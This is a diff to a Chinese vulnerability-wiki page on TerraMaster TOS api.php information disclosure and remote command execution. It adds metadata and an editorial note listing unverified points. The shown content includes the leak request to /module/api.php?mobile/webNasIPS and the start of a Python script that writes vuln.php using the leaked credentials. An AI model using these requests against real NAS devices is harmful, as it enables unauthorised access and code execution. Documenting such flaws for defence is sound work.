@@ -1,9 +1,52 @@
 ---
-fofa: "TerraMaster"
 source: "MrWQ/vulnerability-paper"
+title: "漏洞复现 TerraMaster TOS api.php 信息泄露和远程命令执行"
+product: "TerraMaster TOS"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+fofa_unverified: "TerraMaster"
+source_url: "https://mp.weixin.qq.com/s/mSMqHFqBPkx89XZ7VFUkjQ"
+source_status: "recorded"
+prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-5bb619c284ad6c3db1870ca0"
+entity_id: "ve-5bb619c284ad6c3db1870ca0"
+schema_version: "1"
 ---
 
 # 漏洞复现 TerraMaster TOS api.php 信息泄露和远程命令执行
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+- 保留完整原始资产表达式，未把无字段的搜索词猜改成新的 FOFA 条件；待校验字段语法。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 元数据漏两个CVE且FOFA只保留TerraMaster丢header条件
+- Python代码整体多余缩进且未标语言
+- 检测直接写php文件并未回读证明执行，仅successful不足
+- 无超时和裸except吞错误
+- 正则强依赖响应转义
+- nuclei模板未提供属付费广告非可用附件
+- 清公司介绍和营销尾巴
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mSMqHFqBPkx89XZ7VFUkjQ)
@@ -26,7 +69,7 @@ TerramasterTOS 是中国深圳市图美电子技术（Terramaster）公司的一
 
 1. 使用 POC 查看泄露信息
 
-```
+```http
 GET /module/api.php?mobile/webNasIPS HTTP/1.1
 Host: 
 User-Agent: TNAS
@@ -40,7 +83,7 @@ Connection: keep-alive
 
 2. 利用信息泄露 ADDR: PWD:，使用如下脚本进行 vuln.php 写入 phpinfo，得到回显
 
-```
+```python
     import time, requests,re,hashlib,json
     def usage():
         print("""
